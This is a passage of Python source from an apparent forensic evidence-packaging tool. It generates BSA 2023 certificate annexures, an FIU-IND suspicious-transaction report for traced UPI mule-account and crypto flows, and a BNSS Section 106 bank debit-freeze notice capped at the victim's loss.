            rec.outlines.extend((title, rec.page_no) for title, _ in tmp.outlines)
        return rec

    def build_certificate_pdf(self, output_pdf: str = CERT_PDF) -> str:
        """The two-page certificate: PART A (page 1, with QR) and PART B (page 2)."""
        rec = self._layout_certificate()
        os.makedirs(os.path.dirname(os.path.abspath(output_pdf)), exist_ok=True)
        pdfa = self.fonts.embedded
        info = self._writer().write(rec, output_pdf, self._meta("Certificate under Section 63(4)(c) BSA 2023"), pdfa)
        info["pdfa"] = ("PDF/A-1b structures written (XMP pdfaid, sRGB OutputIntent, embedded fonts, file ID); "
                        "confirm the filed copy with a validator such as veraPDF" if pdfa else
                        "PDF/A claim withheld: no embeddable TrueType font found, base-14 fonts are not embedded")
        self.last_render = {"certificate": info, "recorder": rec}
        return output_pdf

    # ----- Annexures -------------------------------------------------------- #

    def _annex_page(self, rec: PageRecorder, title: str) -> float:
        _frame(rec)
        top = PAGE_H - INNER
        rec.fill_rect(INNER, top - 40, PAGE_W - 2 * INNER, 40, PALETTE["navy"])
        rec.text(PAGE_W / 2, top - 16, "ANNEXURES TO THE CERTIFICATE UNDER SECTION 63(4)(c), BHARATIYA SAKSHYA "
                                       "ADHINIYAM, 2023", "B", 8.4, PALETTE["white"], "center")
        rec.text(PAGE_W / 2, top - 30, f"{self.view['case']} | evidence {self.view['evidence_id']} | certificate "
                                       f"{self.certificate_digest()[:16]}", "R", 6.6, PALETTE["border"], "center")
        rec.line(INNER, top - 40, PAGE_W - INNER, top - 40, PALETTE["cyan"], 1.6)
        y = top - 46
        if self.demo:
            rec.text(PAGE_W / 2, y - 8, "DEMONSTRATION - SYNTHETIC CASE DATA - NOT FOR FILING", "B", 7, PALETTE["red"],
                     "center")
            y -= 12
        if title:
            rec.text(X0, y - 10, title, "B", 7.2, PALETTE["muted"])
            y -= 14
        return y

    def _layout_annexures(self) -> PageRecorder:
        ver = self.verify()
        v = self.view
        rec = PageRecorder(self.fonts, PAGE_W, PAGE_H)
        rec.new_page()
        fl = _Flow(rec, self._annex_page(rec, ""), 1.0, on_new_page=lambda: self._annex_page(rec, "(continued)"))
        w = X1 - X0

        def section(code: str, title: str) -> None:
            if fl.y < 200:
                rec.new_page()
                fl.y = self._annex_page(rec, "")
            rec.outline(f"Annexure {code} - {title}")
            fl.heading(f"ANNEXURE {code}: {title}")

        section("H", "Hash report")
        fl.para(f"Readiness: {ver['status']}.", key="B", color=_status_color(ver["status"]))
        for b in ver["blocking"]:
            fl.para(b, size=7, color=PALETTE["red"], label="!")
        for n in ver["notes"]:
            fl.para(n, size=7, color=PALETTE["amber"], label="-")
        fl.table(("Item", "Algorithm", "Recorded at acquisition", "Recomputed by Sector D", "Status"),
                 [(r["label"], r["algorithm"], r["recorded"] or NOT_RECORDED, r["computed"] or "-", r["status"])
                  for r in ver["hash_rows"]], [w * 0.17, w * 0.09, w * 0.29, w * 0.29, w * 0.16],
                 keys=["R", "R", "M", "M", "B"], size=6.2)
        rc = (ver["rehash"] or {}).get("chunk_roots") or []
        if v["chunk_roots"]:
            fl.table(("4 MB chunk", "Merkle chunk root (recorded)", "Recomputed"),
                     [(str(i), cr, rc[i] if i < len(rc) else "-") for i, cr in enumerate(v["chunk_roots"])],
                     [w * 0.1, w * 0.45, w * 0.45], keys=["R", "M", "M"], size=6.0)
        fl.table(("Document", "Self-digest (SHA-256)", "Status"),
                 [(d["document"], d["recorded"] or "-", d["status"]) for d in ver["digests"]],
                 [w * 0.28, w * 0.5, w * 0.22], keys=["R", "M", "B"], size=6.4)
        if ver["bindings"]:
            fl.table(("Cross-sector binding", "Holds", "Detail"),
                     [(b["check"], "yes" if b["ok"] else "NO", b["detail"]) for b in ver["bindings"]],
                     [w * 0.45, w * 0.1, w * 0.45], keys=["R", "B", "M"], size=6.4)
        sa = ver["sector_a_verifier"]
        fl.para("Sector A verifier: " + ("not run (Sector A module, tree-hash layout or evidence file not available)"
                                         if sa is None else sa[1]), size=7)
        r = self.last_render.get("certificate") or {}
        fl.para(f"PDF engine: {r.get('engine', self.pdf_engine)}; fonts: {self.fonts.describe()}; "
                f"{r.get('pdfa', '')}", size=6.8, color=PALETTE["muted"])

        section("X", "Section 45 BSA 2023 grounds: 14-point exculpatory indicator screen")
        s45 = self.section45_summary()
        if s45["checks"]:
            grp_of = {cid: g for g, ids in self.S45_GROUPS for cid in ids}
            fl.table(("#", "Group", "Check", "Question", "Result"),
                     [(str(i), grp_of.get(str(c.get("check", ""))[:3], "-"), c.get("check", ""),
                       c.get("question", ""), c.get("result", "")) for i, c in enumerate(s45["checks"], 1)],
                     [w * 0.04, w * 0.15, w * 0.25, w * 0.37, w * 0.19], keys=["R", "R", "M", "R", "B"], size=6.2)
            for g in s45["groups"]:
                fl.para(f"{g['group']}: {g['supports_attribution']} support attribution, "
                        f"{g['supports_intrusion_hypothesis']} support an intrusion hypothesis, {g['undetermined']} "
                        f"undetermined" + (f" ({', '.join(g['intrusion_or_undetermined'])})"
                                           if g["intrusion_or_undetermined"] else "") + ".", size=6.9)
            fl.para(f"{s45['label']}: {s45['display']}. Sector B's trojan_defense_probability "
                    f"{s45['trojan_defense_probability']} (intrusion / determined) recomputes to "
                    f"{s45['recomputed_ratio']}; consistent: {s45['ratio_consistent']}. {s45['method_note']}", size=7)
            if s45["needs_reconciliation"]:
                fl.para("Examiner's reconciliation: " + (s45["examiner_reconciliation"] or
                                                         "NOT PROVIDED - required before signature."), size=7,
                        color=PALETTE["text"] if s45["examiner_reconciliation"] else PALETTE["red"])
        else:
            fl.para("Sector B did not evaluate the Section 45 screen for this case.", size=7)

        section("S", "Incident storyline (Sector C), each step anchored to bytes of the evidence")
        steps = (self.c or {}).get("steps") or []
        status_by = {(it["byte_offset"], it["length"], it["sha256"]): it["status"] for it in ver["anchors"]["items"]}
        if steps:
            srows, scol = [], []
            for st in steps:
                p = st.get("provenance") or {}
                stat = status_by.get((p.get("byte_offset"), p.get("length"), p.get("sha256")), "not checked")
                srows.append((str(st.get("step")), str(st.get("timestamp_utc") or "time unknown")[:23],
                              st.get("narrative") or f"{st.get('actor')} {st.get('action')} {st.get('target')}",
                              f"{p.get('source_type', '')} @{p.get('byte_offset')}+{p.get('length')}",
                              str(p.get("sha256", ""))[:24], stat))
                scol.append((None, None, None, None, None,
                             PALETTE["emerald"] if stat == "MATCH" else PALETTE["red"] if stat == MISMATCH
                             else PALETTE["amber"]))
            fl.table(("Step", "Time (UTC)", "Action", "Source @ offset + length", "SHA-256 (first 24)", "Re-hash"),
                     srows, [w * 0.06, w * 0.17, w * 0.32, w * 0.19, w * 0.16, w * 0.10],
                     keys=["R", "M", "R", "R", "M", "B"], size=6.1, colors=scol)
        else:
            fl.para("No Sector C storyline was supplied.", size=7)

        section("L", "Triage leads (Sector B) and their primary byte anchors")
        leads = (self.b or {}).get("symbolic_anchors") or []
        if leads:
            lrows = []
            for ld in leads:
                an = ld.get("symbolic_anchor") or {}
                stat = status_by.get((an.get("byte_offset"), an.get("length"), an.get("sha256")), "not checked")
                lrows.append((ld.get("lead_id", ""), ld.get("threat_category", ""), ld.get("severity", ""),
                              str(ld.get("threat_score", "")), f"{an.get('source_type', '')} @{an.get('byte_offset')}"
                                                              f"+{an.get('length')}", stat))
            fl.table(("Lead", "Category", "Severity", "Score", "Anchor", "Re-hash"), lrows,
                     [w * 0.17, w * 0.24, w * 0.1, w * 0.08, w * 0.31, w * 0.10], keys=["M", "R", "R", "R", "R", "B"],
                     size=6.2)
            fl.para((self.b or {}).get("admissibility_doctrine") or "Scores are triage priorities, not proof; each lead "
                                                                     "rests on its byte anchor.", size=6.6,
                    color=PALETTE["muted"])
        else:
            fl.para("No Sector B triage manifest was supplied.", size=7)

        section("F", "Financial trail (UPI fan-out and crypto exits)")
        cl = self.cluster_data()
        if cl["legs"]:
            fl.table(("Txn", "Time (UTC)", "From", "To", "IFSC / bank", "Amount", "RRN"),
                     [(l["txn_id"], l["timestamp_utc"][:19], l["payer_vpa"], l["payee_vpa"],
                       f"{l['payee_ifsc']} {_bank_for_ifsc(l['payee_ifsc'])}", _fmt_inr(l["amount_inr"]),
                       l["rrn"] + ("" if l.get("rrn_valid", True) else " (INVALID)")) for l in cl["legs"]],
                     [w * 0.06, w * 0.15, w * 0.15, w * 0.15, w * 0.21, w * 0.13, w * 0.15],
                     keys=["R", "M", "R", "R", "R", "R", "M"], size=6.0)
            for x in cl["crypto_exits"]:
                fl.para(f"Crypto exit: {x['amount_usdt']} USDT on {x['chain']} from {x['from_address']} to "
                        f"{x['to_address']} (tx {x['tx_hash']}), {x['delta_t_s']} s after UPI leg {x['upi_txn']}.",
                        size=6.8)
        else:
            fl.para("No financial leads in the Sector B manifest.", size=7)

        if v["bad_sectors"]:
            section("BS", "Bad-sector manifest (Sector A)")
            bsm = v["bad_manifest"] or {}
            fl.para(f"{len(v['bad_sectors'])} sector(s) of {bsm.get('sector_size_bytes')} bytes were unreadable at "
                    f"acquisition, were never re-read, and were filled with {bsm.get('fill_pattern')} in the acquired "
                    f"image; every digest above covers the filled image, and the readable-extent SHA-256 covers the "
                    f"readable bytes only.", size=7)
            shown = v["bad_sectors"][:BS_ANNEX_ROWS]
            bs_rows = [(str(s), str(s * v["sector_size"]), str(v["sector_size"])) for s in shown]
            rest = len(v["bad_sectors"]) - len(shown)
            if rest > 0:
                bs_rows.append((f"+ {rest} further sector(s)", f"not listed here (sectors {v['bad_sectors'][len(shown)]}"
                                                               f" to {v['bad_sectors'][-1]})",
                                f"see the Sector A bad-sector manifest, SHA-256 {bsm.get('manifest_sha256') or NOT_RECORDED}"))
            fl.table(("Sector", "Byte offset", "Length"), bs_rows,
                     [w * 0.3, w * 0.4, w * 0.3], keys=["M", "M", "M"], size=6.2)
            fl.para(f"Bad-sector manifest SHA-256: {bsm.get('manifest_sha256')}", key="M", size=6.4)

        total = rec.page_no
        saved = list(rec.pages)
        for i in range(total):
            rec.pages = saved[:i + 1]
            _footer(rec, f"SUTRA-Trace {LEGAL_VERSION} {LEGAL_REVISION} | annexures to certificate "
                         f"{self.certificate_digest()}", f"Annexure page {i + 1} of {total}")
        rec.pages = saved
        return rec

    def build_annexure_pdf(self, output_pdf: str = ANNEX_PDF) -> str:
        rec = self._layout_annexures()
        os.makedirs(os.path.dirname(os.path.abspath(output_pdf)), exist_ok=True)
        info = self._writer().write(rec, output_pdf, self._meta("Annexures to the certificate under Section 63(4)(c) "
                                                                 "BSA 2023"), self.fonts.embedded)
        self.last_render["annexures"] = info
        self.last_render["annex_recorder"] = rec
        return output_pdf

    # ----- Financial: cluster, STR, freeze notice ---------------------------- #

    def cluster_data(self) -> Dict[str, Any]:
        """UPI fan-out legs, onward transfers, invalid RRNs and crypto exits from the Sector B leads."""
        legs: Dict[str, Dict[str, Any]] = {}
        hubs: List[str] = []
        mules: List[str] = []
        exits: List[Dict[str, Any]] = []
        invalid: Dict[str, List[str]] = {}
        anchors_by_txn: Dict[str, Dict[str, Any]] = {}
        victims: List[str] = []
        for ld in (self.b or {}).get("symbolic_anchors") or []:
            cat, d = ld.get("threat_category"), ld.get("lead_details") or {}
            for _p, an in _anchor_iter(ld):
                if an.get("txn_id"):
                    anchors_by_txn.setdefault(an["txn_id"], an)
            if cat == "RAPID_UPI_SMURFING":
                if d.get("hub_vpa") and d["hub_vpa"] not in hubs:
                    hubs.append(d["hub_vpa"])
                for m in d.get("flagged_mules") or []:
                    if m not in mules:
                        mules.append(m)
                for t in [d.get("inflow")] + list(d.get("outflows") or []) + list(d.get("pooled_inflows") or []):
                    if t and t.get("txn_id"):
                        legs.setdefault(t["txn_id"], dict(t, lead_id=ld.get("lead_id")))
                if d.get("inflow") and d["inflow"].get("payer_vpa") not in victims:
                    victims.append(d["inflow"]["payer_vpa"])
            elif cat == "CROSS_CHAIN_BRIDGE":
                u, ch = d.get("upi") or {}, d.get("chain") or {}
                if u.get("txn_id"):
                    legs.setdefault(u["txn_id"], dict(u, lead_id=ld.get("lead_id")))
                exits.append({"chain": ch.get("chain"), "tx_hash": ch.get("tx_hash"),
                              "from_address": ch.get("from_address"), "to_address": ch.get("to_address"),
                              "amount_usdt": ch.get("amount_usdt"), "timestamp_utc": ch.get("timestamp_utc"),
                              "upi_txn": u.get("txn_id"), "delta_t_s": d.get("delta_t_s"),
                              "lead_id": ld.get("lead_id")})
            elif cat == "INVALID_NPCI_RRN":
                t = d.get("transaction") or {}
                rv = d.get("rrn_validation") or {}
                if t.get("txn_id"):
                    legs.setdefault(t["txn_id"], dict(t, lead_id=ld.get("lead_id")))
                if rv.get("rrn"):
                    invalid[rv["rrn"]] = list(rv.get("reasons") or ["failed NPCI RRN validation"])
        out_legs = []
        for tid in sorted(legs, key=lambda k: (legs[k].get("timestamp_utc") or "", k)):
            t = legs[tid]
            a = anchors_by_txn.get(tid) or {}
            out_legs.append({"txn_id": tid, "timestamp_utc": t.get("timestamp_utc") or "", "payer_vpa": t.get("payer_vpa"),
                             "payee_vpa": t.get("payee_vpa"), "payee_ifsc": t.get("payee_ifsc"),
                             "amount_inr": float(t.get("amount_inr") or 0), "rrn": str(t.get("rrn") or ""),
                             "rrn_valid": str(t.get("rrn")) not in invalid,
                             "rrn_invalid_reasons": invalid.get(str(t.get("rrn")), []), "lead_id": t.get("lead_id"),
                             "anchor": {k: a.get(k) for k in ("file_path", "byte_offset", "length", "sha256")}
                             if a else None})
        onward = [l["payee_vpa"] for l in out_legs
                  if l["payee_vpa"] not in hubs + mules and l["payer_vpa"] in hubs + mules]
        inflow_total = sum(l["amount_inr"] for l in out_legs if l["payee_vpa"] in hubs)
        return {"hub_vpas": hubs, "hub_vpa": hubs[0] if hubs else None, "victim_vpas": victims, "mule_vpas": mules,
                "onward_beneficiaries": list(dict.fromkeys(onward)), "legs": out_legs, "crypto_exits": exits,
                "invalid_rrns": invalid, "total_inflow_inr": round(inflow_total, 2),
                "rrns": [l["rrn"] for l in out_legs if l["rrn"]]}

    def generate_fiu_ind_str_xml(self, cluster_data: Optional[Dict[str, Any]] = None,
                                 output_path: Optional[str] = None,
                                 reporting_entity: Optional[str] = None) -> str:
        """FIU-IND FINnet 2.0 style STR (structure per the Sector D manual; check against FIU-IND's XSD)."""
        cl = cluster_data or self.cluster_data()
        v = self.view
        ET.register_namespace("", STR_NAMESPACE)
        q = lambda tag: f"{{{STR_NAMESPACE}}}{tag}"  # noqa: E731
        root = ET.Element(q("FINnet2_STR"), {"version": "2.0", "generator": f"{LEGAL_VERSION} {LEGAL_REVISION}"})

        def sub(parent: ET.Element, tag: str, text: Any = None, **attrs: Any) -> ET.Element:
            el = ET.SubElement(parent, q(tag), {k: str(x) for k, x in attrs.items() if x is not None})
            if text is not None:
                el.text = str(text)
            return el

        hdr = sub(root, "Header")
        sub(hdr, "ReportType", "STR")
        hub_ifsc = next((l["payee_ifsc"] for l in cl["legs"] if l["payee_vpa"] == cl.get("hub_vpa")), None)
        sub(hdr, "ReportingEntity", reporting_entity or _bank_for_ifsc(hub_ifsc),
            note="To be filed by the Principal Officer of the reporting entity; prepared from an LEA referral")
        sub(hdr, "TimestampUTC", self.generated_utc)
        sub(hdr, "CaseReference", v["case"])
        sub(hdr, "LegalBasis", LAW["pmla12_rule8"])
        sub(hdr, "ReferringAgency", self._case("fir", v["case"] or ""))
        det = sub(root, "SuspiciousTransactionDetails")
        sub(det, "HubVPA", cl.get("hub_vpa") or "", ifsc=hub_ifsc, bank=_bank_for_ifsc(hub_ifsc) if hub_ifsc else None)
        sub(det, "TotalAmountINR", f"{cl['total_inflow_inr']:.2f}")
        vic = sub(det, "VictimAccounts")
        for x in cl["victim_vpas"]:
            sub(vic, "VictimVPA", x)
        mules = sub(det, "MuleAccounts")
        for m in cl["mule_vpas"] + cl["onward_beneficiaries"]:
            credits = [l for l in cl["legs"] if l["payee_vpa"] == m]
            ifsc = credits[0]["payee_ifsc"] if credits else None
            ma = sub(mules, "MuleAccount", tier="1" if m in cl["mule_vpas"] else "2")
            sub(ma, "VPA", m)
            sub(ma, "IFSC", ifsc or "")
            sub(ma, "Bank", _bank_for_ifsc(ifsc))
            sub(ma, "AmountCreditedINR", f"{sum(l['amount_inr'] for l in credits):.2f}")
        rr = sub(det, "RetrievalReferenceNumbers")
        for l in cl["legs"]:
            el = sub(rr, "RRN", l["rrn"], txn=l["txn_id"], valid=str(l["rrn_valid"]).lower(),
                     timestampUTC=l["timestamp_utc"], payer=l["payer_vpa"], payee=l["payee_vpa"],
                     amountINR=f"{l['amount_inr']:.2f}")
            if l["anchor"]:
                el.set("evidenceOffset", str(l["anchor"]["byte_offset"]))
                el.set("evidenceLength", str(l["anchor"]["length"]))
                el.set("evidenceSHA256", str(l["anchor"]["sha256"]))
            if not l["rrn_valid"]:
                el.set("invalidReason", "; ".join(l["rrn_invalid_reasons"]))
        if cl["crypto_exits"]:
            cx = sub(det, "CrossChainExits")
            for x in cl["crypto_exits"]:
                sub(cx, "Exit", chain=x["chain"], txHash=x["tx_hash"], fromAddress=x["from_address"],
                    toAddress=x["to_address"], amountUSDT=x["amount_usdt"], linkedUPITxn=x["upi_txn"],
                    deltaSeconds=x["delta_t_s"])
        n_out = sum(1 for l in cl["legs"] if l["payer_vpa"] in cl["hub_vpas"])
        grounds = (f"Rapid multi-tier UPI fan-out: {_fmt_inr(cl['total_inflow_inr'])} credited to "
                   f"{cl.get('hub_vpa')} was dispersed in {n_out} transfers to {len(cl['mule_vpas'])} mule VPAs at "
                   f"different banks within minutes, with onward transfers to {len(cl['onward_beneficiaries'])} "
                   f"further beneficiaries")
        if cl["crypto_exits"]:
            grounds += f" and {len(cl['crypto_exits'])} UPI-to-USDT bridge exit(s)"
        if cl["invalid_rrns"]:
            grounds += f"; {len(cl['invalid_rrns'])} RRN(s) fail NPCI format validation"
        sub(det, "GroundsForSuspicion", grounds + ". Each transaction is anchored to bytes of the seized evidence.")
        eb = sub(root, "EvidenceBinding")
        sub(eb, "EvidenceID", v["evidence_id"])
        sub(eb, "SHA256", v["sha256"])
        sub(eb, "MerkleRoot", v["merkle_root"])
        sub(eb, "BoundRoot", v["bound_root"])
        sub(eb, "TriageManifestSHA256", (self.b or {}).get("manifest_sha256") or "")
        sub(eb, "CertificateSHA256", self.certificate_digest())
        ET.indent(root) if hasattr(ET, "indent") else None
        xml = '<?xml version="1.0" encoding="UTF-8"?>\n' + ET.tostring(root, encoding="unicode") + "\n"
        problems = validate_str_xml(xml)
        if problems:
            raise RuntimeError("STR XML failed its structural check: " + "; ".join(problems))
        if output_path:
            os.makedirs(os.path.dirname(os.path.abspath(output_path)), exist_ok=True)
            with open(output_path, "w", encoding="utf-8", newline="\n") as f:
                f.write(xml)
        return xml

    FREEZE_TITLE = ("NOTICE UNDER SECTION 106 READ WITH SECTION 107, BHARATIYA NAGARIK SURAKSHA SANHITA, 2023 "
                    "(WITH INTIMATION FOR REFERRAL UNDER SECTION 66(2) PMLA, 2002 FOR ACTION UNDER SECTION 17(1A) "
                    "PMLA)")

    def generate_sec_106_bnss_freeze_notice(self, cluster_data: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """
        Debit-freeze notice to each beneficiary bank under Section 106 read with Section 107 BNSS 2023.
        Each lien is the net tainted balance the account still holds (credited from the listed
        transactions less onward transfers traced out of it), so the aggregate never exceeds the
        principal loss. Transactions whose RRN fails NPCI validation are not targets: they are listed
        for verification by a Section 94 BNSS notice. A Section 17(1A) PMLA freeze is the Director's
        order; this notice only intimates the case for referral under Section 66(2) PMLA.
        """
        cl = cluster_data or self.cluster_data()
        v = self.view
        io = self._case("io", self._party("name"))
        valid = [l for l in cl["legs"] if l.get("rrn_valid", True)]
        disputed = [{"txn_id": l["txn_id"], "timestamp_utc": l["timestamp_utc"], "payer_vpa": l["payer_vpa"],
                     "payee_vpa": l["payee_vpa"], "payee_ifsc": l["payee_ifsc"], "bank": _bank_for_ifsc(l["payee_ifsc"]),
                     "amount_inr": l["amount_inr"], "rrn": l["rrn"], "reasons": l.get("rrn_invalid_reasons") or [],
                     "evidence_anchor": l["anchor"],
                     "action": f"Not frozen. Verify with the issuing bank / NPCI by notice under {LAW['bnss94']} "
                               f"before any restraint."} for l in cl["legs"] if not l.get("rrn_valid", True)]
        loss_cap = round(sum(l["amount_inr"] for l in valid if l["payer_vpa"] in cl["victim_vpas"]
                             and l["payee_vpa"] in cl["hub_vpas"]) or cl["total_inflow_inr"], 2)
        targets = []
        for vpa in cl["hub_vpas"] + cl["mule_vpas"] + cl["onward_beneficiaries"]:
            credits = [l for l in valid if l["payee_vpa"] == vpa]
            if not credits:
                continue
            debits = [l for l in valid if l["payer_vpa"] == vpa]
            credited = round(sum(l["amount_inr"] for l in credits), 2)
            outflow = round(sum(l["amount_inr"] for l in debits), 2)
            ifsc = credits[0]["payee_ifsc"]
            tier = "HUB" if vpa in cl["hub_vpas"] else "MULE_TIER_1" if vpa in cl["mule_vpas"] else "ONWARD_TIER_2"
            targets.append({"vpa": vpa, "tier": tier, "ifsc": ifsc, "bank": _bank_for_ifsc(ifsc),
                            "amount_credited_inr": credited, "amount_outflow_inr": outflow,
                            "net_retained_inr": round(max(0.0, credited - outflow), 2),
                            "lien_amount_inr": round(max(0.0, credited - outflow), 2),
                            "rrns": [l["rrn"] for l in credits], "outflow_rrns": [l["rrn"] for l in debits],
                            "evidence_anchors": [l["anchor"] for l in credits if l["anchor"]]})
        aggregate = round(sum(t["lien_amount_inr"] for t in targets), 2)
        if aggregate > loss_cap + 0.005:   # never restrain more than was taken from the victim(s)
            scale = loss_cap / aggregate
            for t in targets:
                t["lien_amount_inr"] = round(t["lien_amount_inr"] * scale, 2)
            aggregate = round(sum(t["lien_amount_inr"] for t in targets), 2)
        targets = [t for t in targets if t["lien_amount_inr"] > 0] + \
                  [t for t in targets if t["lien_amount_inr"] <= 0]
        by_bank: Dict[str, List[Dict[str, Any]]] = {}
        for t in targets:
            by_bank.setdefault(t["bank"], []).append(t)
        notice_id = "SUTRA-FRZ-" + _sha256_hex(canonical_json({"case": v["case"], "targets": targets}))[:12].upper()
        statute = f"{LAW['bnss106']} read with {LAW['bnss107']}"
        directions = [
            "Mark a debit freeze (lien) on each account / VPA listed for the lien amount shown against it. The lien is "
            "the net tainted balance: the amount credited from the listed transactions less the onward transfers "
            "already traced out of the account. The aggregate lien does not exceed the principal loss stated above.",
            f"Restrict debits strictly to the lien amount. Do not freeze, hold or withhold any balance beyond it; "
            f"untainted funds may be restrained only on an order of the Magistrate under {LAW['bnss107']}.",
            "Preserve KYC, device-binding, login IP and transaction records for the listed accounts.",
            "Confirm compliance, with the balance held under lien, to the undersigned and on the NCRP / 1930 portal.",
        ]
        legal_notes = [
            f"The police seizure (debit freeze) is made under {LAW['bnss106']} and is reported forthwith to the "
            f"jurisdictional Magistrate as Section 106(3) requires. Any attachment beyond the lien is sought from the "
            f"Magistrate by application under {LAW['bnss107']}.",
            f"This notice is not an order under {LAW['pmla17_1a']}, which only the Director or an officer authorised "
            f"by him can make. The case is intimated to the Directorate of Enforcement under {LAW['pmla66_2']} "
            f"for its consideration of action under Section 17(1A).",
        ]
        if disputed:
            legal_notes.append(f"{len(disputed)} transaction(s) whose RRN fails NPCI format validation are not frozen; "
                               f"they are listed separately for verification by notice under {LAW['bnss94']}.")
        lines = [self.FREEZE_TITLE, f"Notice No. {notice_id}    Date: {ist_date_time(self.generated_utc)[0]}",
                 f"Case: {self._case('fir', v['case'] or '')}    Evidence ID: {v['evidence_id']}",
                 f"Principal loss (cap on the aggregate lien): {_fmt_inr(loss_cap)}    Aggregate lien: "
                 f"{_fmt_inr(aggregate)}", ""]
        for bank, ts in by_bank.items():
            lines.append(f"To: The Nodal Officer, {bank}")
            for t in ts:
                lines.append(f"  - {t['vpa']} ({t['tier']}), IFSC {t['ifsc'] or '-'}: lien {_fmt_inr(t['lien_amount_inr'])}"
                             f" (credited {_fmt_inr(t['amount_credited_inr'])}, traced out "
                             f"{_fmt_inr(t['amount_outflow_inr'])}); RRN {', '.join(t['rrns']) or '-'}")
            lines.append("")
        if disputed:
            lines.append(f"Disputed or spoofed RRN logs (NOT frozen; for verification under {LAW['bnss94']}):")
            for d in disputed:
                lines.append(f"  - {d['txn_id']} {d['payer_vpa']} -> {d['payee_vpa']} ({d['bank']}), "
                             f"{_fmt_inr(d['amount_inr'])}, RRN {d['rrn']}: {'; '.join(d['reasons']) or 'invalid'}")
            lines.append("")
        lines += ["Directions:"] + [f"  {i}. {d}" for i, d in enumerate(directions, 1)] + [""] + legal_notes + [
            "", f"Evidence: SHA-256 {v['sha256']}; Merkle root {v['merkle_root']}; each RRN above is anchored to bytes "
                f"of the seized evidence (offsets in the JSON form of this notice).",
            "", f"({io})", f"{self._party('designation', 'Investigating Officer')}, {self._party('police_station')}"]
        return {"notice_id": notice_id, "title": self.FREEZE_TITLE, "statute": statute,
                "pmla_referral": {"intimation_under": LAW["pmla66_2"], "for_action_under": LAW["pmla17_1a"],
                                  "order_issued_by_police": False},
                "issued_utc": self.generated_utc,
                "issued_by": {"name": io, "designation": self._party("designation"),
                              "police_station": self._party("police_station")},
                "case": self._case("fir", v["case"] or ""), "case_reference": v["case"],
                "principal_loss_cap_inr": loss_cap, "aggregate_lien_inr": aggregate,
                "hub_vpa": cl.get("hub_vpa"), "mule_vpas": cl["mule_vpas"],
                "onward_beneficiaries": cl["onward_beneficiaries"], "targets": targets,
                "disputed_or_spoofed_rrn_logs": disputed,
                "addressees": sorted(by_bank), "directions": directions, "legal_notes": legal_notes,
                "rrns": [l["rrn"] for l in valid if l["rrn"]],
                "evidence_binding": {"evidence_id": v["evidence_id"], "sha256": v["sha256"],
                                     "merkle_root": v["merkle_root"], "certificate_sha256": self.certificate_digest()},
                "demonstration": self.demo, "text": "\n".join(lines) + "\n"}

    # ----- Bundle ----------------------------------------------------------- #

    def export_legal_bundle(self, output_dir: str = "legal_package") -> Dict[str, str]:
        os.makedirs(output_dir, exist_ok=True)
        p = lambda n: os.path.join(output_dir, n)  # noqa: E731
        paths = {"certificate_pdf": self.build_certificate_pdf(p(CERT_PDF)),
                 "annexure_pdf": self.build_annexure_pdf(p(ANNEX_PDF)),
                 "str_xml": p(STR_XML), "freeze_notice_json": p(FREEZE_JSON), "freeze_notice_txt": p(FREEZE_TXT),
                 "qr_png": self.generate_qr_code_image(p(QR_PNG)), "certificate_json": p(CERT_JSON)}
        self.generate_fiu_ind_str_xml(output_path=paths["str_xml"])
        notice = self.generate_sec_106_bnss_freeze_notice()
        with open(paths["freeze_notice_json"], "w", encoding="utf-8") as f:
            json.dump(notice, f, indent=2, ensure_ascii=False)
        with open(paths["freeze_notice_txt"], "w", encoding="utf-8", newline="\n") as f:
            f.write(notice["text"])
        with open(paths["certificate_json"], "w", encoding="utf-8") as f:
            json.dump({"certificate": self.certificate_data(), "certificate_sha256": self.certificate_digest(),
                       "qr_payload": self.generate_qr_payload()}, f, indent=2, ensure_ascii=False)
        files = {}
        for k, path in sorted(paths.items()):
            with open(path, "rb") as f:
                files[os.path.basename(path)] = {"sha256": _sha256_hex(f.read()), "bytes": os.path.getsize(path)}
        bundle = {"schema": "SUTRA-LEGAL-BUNDLE/1", "engine": f"{LEGAL_VERSION} {LEGAL_REVISION}",
                  "generated_utc": self.generated_utc, "case_reference": self.view["case"],
                  "evidence_id": self.view["evidence_id"], "scenario": self.scenario.value,
                  "track": self.track.statutory_code,
                  "strict_mode": self.strict,
                  "readiness": self.verify()["status"], "certificate_sha256": self.certificate_digest(),
                  "pdf_engine": self.last_render.get("certificate", {}).get("engine"),
                  "qr_engine": self.qr_matrix()[1], "fonts": self.fonts.describe(),
                  "pdfa": self.last_render.get("certificate", {}).get("pdfa"), "demonstration": self.demo,
                  "files": files}
        bundle["bundle_sha256"] = _sha256_hex(canonical_json(bundle))
        key = _audit_key()
        bundle["bundle_hmac_sha256"] = hmac.new(key, canonical_json(bundle), hashlib.sha256).hexdigest() if key else None
        paths["bundle_manifest"] = p(BUNDLE_MANIFEST)
        with open(paths["bundle_manifest"], "w", encoding="utf-8") as f:
            json.dump(bundle, f, indent=2, ensure_ascii=False)
        return paths


_STR_REQUIRED = ("Header/ReportType", "Header/ReportingEntity", "Header/TimestampUTC", "Header/CaseReference",
                 "SuspiciousTransactionDetails/HubVPA", "SuspiciousTransactionDetails/TotalAmountINR",
                 "SuspiciousTransactionDetails/MuleAccounts", "SuspiciousTransactionDetails/RetrievalReferenceNumbers",
                 "SuspiciousTransactionDetails/GroundsForSuspicion", "EvidenceBinding/SHA256")


def validate_str_xml(xml: str) -> List[str]:
    """Structural check of the STR against the element layout in the Sector D manual."""
    try:
        root = ET.fromstring(xml)
    except ET.ParseError as e:
        return [f"not well-formed: {e}"]
    ns = {"s": STR_NAMESPACE}
    errs = []
    if root.tag != f"{{{STR_NAMESPACE}}}FINnet2_STR":
        errs.append(f"root element is {root.tag}")
    for path in _STR_REQUIRED:
        el = root.find("s:" + path.replace("/", "/s:"), ns)
        if el is None:
            errs.append(f"missing {path}")
    amt = root.find("s:SuspiciousTransactionDetails/s:TotalAmountINR", ns)
    if amt is not None and not re.fullmatch(r"\d+\.\d{2}", amt.text or ""):
        errs.append("TotalAmountINR is not a decimal amount")
    for rrn in root.findall("s:SuspiciousTransactionDetails/s:RetrievalReferenceNumbers/s:RRN", ns):
        if not re.fullmatch(r"\d{12}", rrn.text or ""):
            errs.append(f"RRN {rrn.text!r} is not 12 digits")
    for ma in root.findall("s:SuspiciousTransactionDetails/s:MuleAccounts/s:MuleAccount", ns):
        if ma.find("s:VPA", ns) is None or not re.fullmatch(r"[\w.\-]+@[\w.\-]+", ma.find("s:VPA", ns).text or ""):
            errs.append("MuleAccount without a valid VPA")
    return errs


# --------------------------------------------------------------------------- #
# Self-test                                                                   #
